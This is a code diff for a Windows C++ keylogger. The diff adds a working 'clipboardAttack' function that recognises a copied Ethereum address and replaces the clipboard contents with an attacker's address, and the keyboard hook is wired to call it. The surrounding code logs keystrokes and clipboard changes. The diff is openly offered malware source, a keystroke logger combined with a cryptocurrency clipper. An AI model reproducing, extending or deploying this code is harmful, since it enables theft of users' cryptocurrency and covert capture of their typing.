@@ -75,15 +75,37 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile.close();
 }
 
-/* clipboardAttack() is an famous attack especially in the crypto space, it will scan your clipboard for an cryptocurrency address then changes */
+bool isEthAddress(std::wstring cbText){
+	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42) {
+		return TRUE;
+	}
+	return FALSE;
+}
 
-void clipboardAttack(){
-	std::wstring cbText = getClipboardText();
-	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42){
+/* clipboardAttack is a famous attack in the crypto space, it will scan your clipboard for amy cryptocurrency address, when copied it will be immediately replaced with the attacker's address.
+This function check if the new clipboard data is an ethereum address then allocates a global memory object for the attacker's address to be copied to clipboard instead */
+
+void clipboardAttack(LPWSTR ethAddress){
+	std::wstring	cbText;
+	HGLOBAL 		dstHandle;
+	LPWSTR			dstEthAddress;
+	DWORD			len;
+
+	len = wcslen(ethAddress); // Should be 42
+	cbText = getClipboardText();
+	if (isEthAddress(ethAddress)){
 		std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
+		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
+		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
+		memcpy(dstEthAddress, ethAddress, len * sizeof(WCHAR));
+		dstEthAddress[len] = NULL;
+		GlobalUnlock(dstHandle);
+
 		if (OpenClipboard(NULL) == 0){
 		std::cout << "Error in openclipboard" << std::endl;
 		}
+		EmptyClipboard();
+		SetClipboardData(CF_UNICODETEXT, dstHandle);
 		CloseClipboard();
 	}
 }
@@ -205,7 +227,7 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
 		std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
 		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
 			writeClipboardChange();
-			clipboardAttack();
+			clipboardAttack(L"0x000000000000000000000000000000000000dEaD");
 			g_prevClipboardSequenceNumber = currentClipboardSequenceNumber;
 		}
 		// NEED TO FIX: first time program enters it prints 1 char
